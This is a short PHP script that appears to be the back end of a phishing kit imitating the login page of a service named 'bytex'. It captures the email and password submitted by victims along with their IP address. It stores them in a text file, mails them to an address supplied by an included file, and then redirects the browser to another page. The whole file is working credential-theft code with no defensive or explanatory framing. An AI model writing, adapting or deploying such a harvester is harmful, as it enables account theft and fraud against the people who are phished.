<?php
$file = "____ByteX___.txt";
$Email = $_POST['Email'];
$Password = $_POST['Password'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "Email   	: ");
fwrite($handle, "$Email");
fwrite($handle, "\n");
fwrite($handle, "Password   	: ");
fwrite($handle, "$Password");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time		: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "https://accounts.bytex.io/login/ ");
fwrite($handle, "\n");
fclose($handle);
$Email = $_POST['Email'];
$Password = $_POST['Password'];
$ip=$_SERVER['REMOTE_ADDR'];

$message   = "

Email : ".$Email." 
Password : ".$Password." 

";
include 'mail.php';
$subject = "centric ".$ip." ";
$headers = "From: bytex <fauzijasman193@gmail.com>";
mail($rezult_mail, $subject, $message, $headers);
echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/email.html?login\";
// -->
</script>";
?>